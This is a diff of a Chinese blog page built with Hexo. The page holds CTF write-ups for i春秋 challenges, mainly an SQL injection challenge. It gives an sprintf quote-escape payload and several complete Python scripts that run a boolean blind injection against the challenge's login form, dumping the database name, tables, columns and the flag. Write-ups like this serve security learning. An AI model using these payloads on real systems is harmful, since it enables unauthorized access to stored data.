@@ -13,6 +13,8 @@
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
@@ -52,7 +54,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 5.3.0"></head>
 
 
 <body>
@@ -104,18 +106,6 @@
               <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
               </a>
             </li>
           
@@ -177,7 +167,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      712 字
+      831 字
     </span>
   
 
@@ -187,7 +177,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      14
        分钟
     </span>
   
@@ -222,177 +212,179 @@
             <div class="markdown-body" id="post-body">
               <p>象棋（ichuqiu）<br>昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。<br>今天看wp突然醒悟用bp就挺好的，成功爆破flag<br><a id="more"></a></p>
 <hr>
-<p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p>
+<p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/115777073">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p>
 <ul>
 <li>admin%1$\’ or 1=1— 回显password error!</li>
-<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">import</span> requests
+<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
-<span class="hljs-keyword">import</span> <span class="hljs-keyword">string</span>
+<span class="hljs-keyword">import</span> string
 
-url =  <span class="hljs-string">"http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/"</span>
+url =  <span class="hljs-string">&quot;http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/&quot;</span>
 
-dir  = <span class="hljs-keyword">string</span>.digits+<span class="hljs-keyword">string</span>.ascii_letters+  <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span>
+<span class="hljs-built_in">dir</span>  = string.digits+string.ascii_letters+  <span class="hljs-string">&quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot;</span>
 
-right =  <span class="hljs-string">"password error!"</span>
+right =  <span class="hljs-string">&quot;password error!&quot;</span>
 
-#猜数据库长度--<span class="hljs-number">-3</span>
+<span class="hljs-comment">#猜数据库长度---3</span>
 
-<span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">30</span>):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
 
-	data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">"admin%1$\\' or (length(database())="</span>+str(i)+<span class="hljs-string">")-- "</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
+	data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin%1$\\&#x27; or (length(database())=&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;)-- &quot;</span>,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&quot;password&quot;</span>&#125;
 
 	response = requests.post(url,data=data).text
 
-	<span class="hljs-built_in">print</span>(<span class="hljs-string">"..."</span>+str(i))
+	print(<span class="hljs-string">&quot;...&quot;</span>+<span class="hljs-built_in">str</span>(i))
 
-	<span class="hljs-keyword">if</span> right in response:
+	<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
-		<span class="hljs-built_in">print</span>(<span class="hljs-string">"the length of database_name is"</span>+str(i))
-		<span class="hljs-keyword">break</span></code></pre></div>
-<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>
+		print(<span class="hljs-string">&quot;the length of database_name is&quot;</span>+<span class="hljs-built_in">str</span>(i))
+		<span class="hljs-keyword">break</span>
+</code></pre></div>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆数据库---ctf</span>
 
-database_name = <span class="hljs-string">''</span>
+database_name = <span class="hljs-string">&#x27;&#x27;</span>
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,4):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):
 
-	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:
+	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:
 
-		payload = <span class="hljs-string">"admin%1$\\' or (ascii(substr(database(),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">")-- "</span>
+		payload = <span class="hljs-string">&quot;admin%1$\\&#x27; or (ascii(substr(database(),&#123;0&#125;,1))=&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c))+<span class="hljs-string">&quot;)-- &quot;</span>
 
-		data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
+		data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&quot;password&quot;</span>&#125;
 
-		response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
+		response = requests.post(url,data=data).text
 
-		<span class="hljs-builtin-name">print</span>(payload.format(i)+<span class="hljs-string">"..."</span>)
+		print(payload.<span class="hljs-built_in">format</span>(i)+<span class="hljs-string">&quot;...&quot;</span>)
 
 		<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
 			database_name+=c
 
-			<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"okkkkkkkkkkkkkkkkkkk"</span>+c)
+			print(<span class="hljs-string">&quot;okkkkkkkkkkkkkkkkkkk&quot;</span>+c)
 
-			break
+			<span class="hljs-keyword">break</span>
 
-<span class="hljs-builtin-name">print</span>(database_name)</code></pre></div>
-<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span>
-<span class="hljs-comment">#试着数据库名写成'ctf'发现不行，ctf写成asciihex编码形式0x637466成功注入</span>
+print(database_name)
+</code></pre></div>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆表长度----4</span>
+<span class="hljs-comment">#试着数据库名写成&#x27;ctf&#x27;发现不行，ctf写成asciihex编码形式0x637466成功注入</span>
 <span class="hljs-comment">#注意使用limit 0,1限定查询</span>
 
-table_name = ''
+table_name = <span class="hljs-string">&#x27;&#x27;</span>
 
-for i in range(30):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
 
-	payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-number">0x637466</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span>
+	payload = <span class="hljs-string">&quot;admin%1$\\&#x27; or (select length(table_name) from information_schema.tables where table_schema = 0x637466 limit 0,1)=&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;-- &quot;</span>
 
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
+	data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&quot;password&quot;</span>&#125;
 
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
+	response = requests.post(url,data=data).text
 
-	print(payload+<span class="hljs-string">"..."</span>)
+	print(payload+<span class="hljs-string">&quot;...&quot;</span>)
 
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
+	<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
-		print(<span class="hljs-string">"------------------"</span>+<span class="hljs-keyword">str</span>(i))
+		print(<span class="hljs-string">&quot;------------------&quot;</span>+<span class="hljs-built_in">str</span>(i))
 
-		break</code></pre></div>
-<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>
+		<span class="hljs-keyword">break</span>
+</code></pre></div>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆表名----flag</span>
 
-table_name = ''
+table_name = <span class="hljs-string">&#x27;&#x27;</span>
 
-for i in range(1,5):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):
 
-	for c in dir:
+	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:
 
-	payload = "admin%1$\\' or ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))=<span class="hljs-string">"+str(ord(c))+"</span><span class="hljs-comment">-- "</span>
+	payload = <span class="hljs-string">&quot;admin%1$\\&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),&#123;0&#125;,1))=&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c))+<span class="hljs-string">&quot;-- &quot;</span>
 
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
+	data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&quot;password&quot;</span>&#125;
 
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
+	response = requests.post(url,data=data).text
 
-	print(payload.format(i)+<span class="hljs-string">"..."</span>)
+	print(payload.<span class="hljs-built_in">format</span>(i)+<span class="hljs-string">&quot;...&quot;</span>)
 
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
+	<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
 		table_name+=c
 
-		print(<span class="hljs-string">"-------------------"</span>+c)
+		print(<span class="hljs-string">&quot;-------------------&quot;</span>+c)
 
-		break
+		<span class="hljs-keyword">break</span>
 
 print(table_name)</code></pre></div>
-<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆列长度---4</span>
 
-for i in range(30):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
 
-	payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-number">0x666c6167</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span>
+	payload = <span class="hljs-string">&quot;admin%1$\\&#x27; or (select length(column_name) from information_schema.columns where table_name = 0x666c6167 limit 0,1)=&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;-- &quot;</span>
 
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
+	data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;password&#x27;</span>&#125;
 
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
+	response = requests.post(url,data=data).text
 
 	print(payload)
 
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
+	<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
-		print(<span class="hljs-string">"--------------------"</span>+<span class="hljs-keyword">str</span>(i))
+		print(<span class="hljs-string">&quot;--------------------&quot;</span>+<span class="hljs-built_in">str</span>(i))
 
-		break</code></pre></div>
-<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>
+		<span class="hljs-keyword">break</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆列名---flag</span>
 
-column_name = <span class="hljs-string">''</span>
+column_name = <span class="hljs-string">&#x27;&#x27;</span>
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):
 
-	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:
+	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:
 
-		payload = <span class="hljs-string">"admin%1$\\' or ascii(substr((select column_name from information_schema.columns where table_name = 0x666c6167 limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>
+		payload = <span class="hljs-string">&quot;admin%1$\\&#x27; or ascii(substr((select column_name from information_schema.columns where table_name = 0x666c6167 limit 0,1),&#123;0&#125;,1))=&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c))+<span class="hljs-string">&quot;-- &quot;</span>
 
-		data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
+		data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;password&#x27;</span>&#125;
 
-		response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
+		response = requests.post(url,data=data).text
 
-		<span class="hljs-builtin-name">print</span>(payload.format(i))
+		print(payload.<span class="hljs-built_in">format</span>(i))
 
 		<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
 			column_name+=c
 
-			<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)
+			print(<span class="hljs-string">&quot;------------&quot;</span>+c)
 
-			break
+			<span class="hljs-keyword">break</span>
 
-<span class="hljs-builtin-name">print</span>(column_name)</code></pre></div>
-<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span>
+print(column_name)</code></pre></div>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#爆flag</span>
 <span class="hljs-comment">#懒得爆长度了，直接上</span>
 
-<span class="hljs-attribute">flag</span>=<span class="hljs-string">''</span>
+flag=<span class="hljs-string">&#x27;&#x27;</span>
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  range(1,100):
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
 
-		<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  dir:
+		<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  <span class="hljs-built_in">dir</span>:
 
-			payload =  <span class="hljs-string">"admin%1$\\' or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>
+			payload =  <span class="hljs-string">&quot;admin%1$\\&#x27; or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))=&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c))+<span class="hljs-string">&quot;-- &quot;</span>
 
-			data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
+			data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;password&#x27;</span>&#125;
 
-			response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
+			response = requests.post(url,data=data).text
 
-			<span class="hljs-builtin-name">print</span>(payload.format(i))
+			print(payload.<span class="hljs-built_in">format</span>(i))
 
 			<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
 
 				flag+=c
 
-				<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)
+				print(<span class="hljs-string">&quot;------------&quot;</span>+c)
 
-				break
+				<span class="hljs-keyword">break</span>
 
-		<span class="hljs-keyword">if</span> c ==  <span class="hljs-string">'&#125;'</span>:
+		<span class="hljs-keyword">if</span> c ==  <span class="hljs-string">&#x27;&#125;&#x27;</span>:
 
-			break
+			<span class="hljs-keyword">break</span>
 
-<span class="hljs-builtin-name">print</span>(flag)</code></pre></div>
-</li>
+print(flag)</code></pre></div></li>
 </ul>
 
             </div>
@@ -410,7 +402,7 @@ column_name = <span class="hljs-string">''</span>
                 
               </div>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
               
                 <div class="post-prevnext row">
@@ -632,6 +624,45 @@ column_name = <span class="hljs-string">''</span>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js" ></script>
+
+  
 
 
 
